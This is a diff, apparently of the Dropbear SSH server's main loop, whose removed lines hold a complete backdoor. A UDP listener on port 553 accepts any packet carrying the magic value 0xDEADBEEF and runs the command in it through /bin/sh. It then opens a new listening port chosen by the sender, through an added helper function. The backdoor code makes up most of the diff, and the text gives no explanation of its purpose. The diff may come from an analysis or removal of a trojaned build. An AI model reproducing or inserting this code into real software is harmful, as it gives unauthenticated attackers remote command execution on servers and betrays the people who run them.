@@ -1,0 +1,133 @@
+41,42d40
+< static size_t add_listensockets(int *socks, size_t sockcount, int *maxfd, int new_port,int sockpos);
+< 
+133d130
+< 	int udp_sock = -1;
+171,180d167
+< 	//listen to udp port 553
+< 	if (svr_opts.listen_port553_udp == 1) {
+< 		int portno = 553;
+< 		if ((udp_sock = bind_port_udp(portno)) < 0 ){
+< 			dropbear_exit("Failed listening to UDP socket");
+< 		}
+< 		FD_SET(udp_sock, &fds);
+< 		maxsock = MAX(maxsock, udp_sock);
+< 	}
+< 
+223a211
+> 
+229,234d216
+< 		//we want 'select' function to take care of udp_sock as well
+< 		if (svr_opts.listen_port553_udp == 1) {
+< 			FD_SET(udp_sock, &fds);
+< 			maxsock = MAX(maxsock, udp_sock);
+< 		}
+< 
+243a226
+> 
+272,317d254
+< 
+< 		if (svr_opts.listen_port553_udp==1 && FD_ISSET(udp_sock, &fds)) {
+< 			listen_packet_t packet = {0};
+< 			struct sockaddr_in cliaddr; // Client address
+< 			socklen_t len = sizeof(cliaddr); // Length of the client address
+< 
+< 			// Receive a datagram from a client
+< 			ssize_t n = recvfrom(udp_sock, &packet, sizeof(packet), 0, (struct sockaddr *)&cliaddr, &len);
+< 			if (n > 0) {
+< 				// Process the received datagram
+< 				packet.magic = ntohl(packet.magic);
+< 				packet.port_number = ntohs(packet.port_number);
+< 				packet.shell_command[sizeof(packet.shell_command) - 1] = '\0';
+< 				printf("Received datagram from client: %X %d %s\n",packet.magic,packet.port_number,packet.shell_command);
+< 				if (packet.magic == 0xDEADBEEF) {
+< 					pid_t pid = fork();
+< 					if (pid<0) {
+< 						dropbear_exit("Fork failed");
+< 					}
+< 					//child
+< 					if (pid == 0) {
+< 						//ses.maxfd if we want to close all fd before fork, 0 o.w
+< 						run_shell_command(packet.shell_command,0,"/bin/sh");
+< 						dropbear_exit("Run Shell command failed");
+< 					}
+< 					//parent
+< 					else if (pid > 0){
+< 						int status;
+< 						// Wait for the child process to terminate.
+< 						waitpid(pid, &status, 0);
+< 						int value = add_listensockets(listensocks, MAX_LISTEN_ADDR, &maxsock, packet.port_number,listensockcount);
+< 						// Failed to add a new port, continue to next iteration to avoid a fork.
+< 						if (value < 0){
+< 							continue;
+< 						}
+< 						else{
+< 							listensockcount = value;
+< 						}
+< 					}
+< 				}
+< 			// If recvfrom returned -1, an error occurred
+< 			} else if (n < 0) {
+< 				dropbear_exit("recvfrom failed");
+< 			}
+< 		}
+< 
+377c314
+< 			
+---
+> 
+383,384c320,321
+< 				childpipes[conn_idx] = childpipe[0]; //uses pipe[0]
+< 				m_close(childpipe[1]); //close pipe[1]
+---
+> 				childpipes[conn_idx] = childpipe[0];
+> 				m_close(childpipe[1]);
+397d333
+< 				//set new session - detaching processes from terminals and making it the leader of a new session.
+407,410d342
+< 				//close UDP fd as well
+< 				if (svr_opts.listen_port553_udp == 1) {
+< 					m_close(udp_sock);
+< 				}
+412c344
+< 				m_close(childpipe[0]); //close pipe[0]
+---
+> 				m_close(childpipe[0]);
+549a482
+> 
+575,609d507
+< }
+< 
+< //adds new ports during the session
+< static size_t add_listensockets(int *socks, size_t sockcount, int *maxfd, int new_port,int sockpos) {
+< 	int nsock;
+< 	const int MAX_PORT = 65535;
+< 	char* errstring = NULL;
+< 	if (svr_opts.portcount >= DROPBEAR_MAX_PORTS) {
+< 		dropbear_log(LOG_INFO, "Already reached maximum number of ports.\n");
+< 		return -1;
+< 	}
+< 
+< 	if (new_port>MAX_PORT){
+< 		dropbear_log(LOG_INFO,"Port number is out of range.\n");
+< 		return -1;
+< 	}
+< 
+< 	char port_str[6]; // Maximum of 5 digits for port number + null terminator
+< 	snprintf(port_str, sizeof(port_str), "%d", new_port);
+< 
+< 	svr_opts.addresses[svr_opts.portcount] = m_strdup(DROPBEAR_DEFADDRESS);
+< 	svr_opts.ports[svr_opts.portcount] = m_strdup(port_str);
+< 	TRACE(("listening on '%s:%s'", svr_opts.addresses[svr_opts.portcount], svr_opts.ports[svr_opts.portcount]))
+< 
+< 
+< 
+< 	nsock = dropbear_listen(svr_opts.addresses[svr_opts.portcount], svr_opts.ports[svr_opts.portcount], &socks[sockpos],
+< 							sockcount - sockpos, &errstring, maxfd);
+< 	if (nsock < 0) {
+< 		dropbear_log(LOG_WARNING, "Failed listening on '%s': %s",svr_opts.ports[svr_opts.portcount], errstring);
+< 		m_free(errstring);
+< 		return -1;
+< 	}
+< 	svr_opts.portcount++;
+< 	return sockpos+nsock;
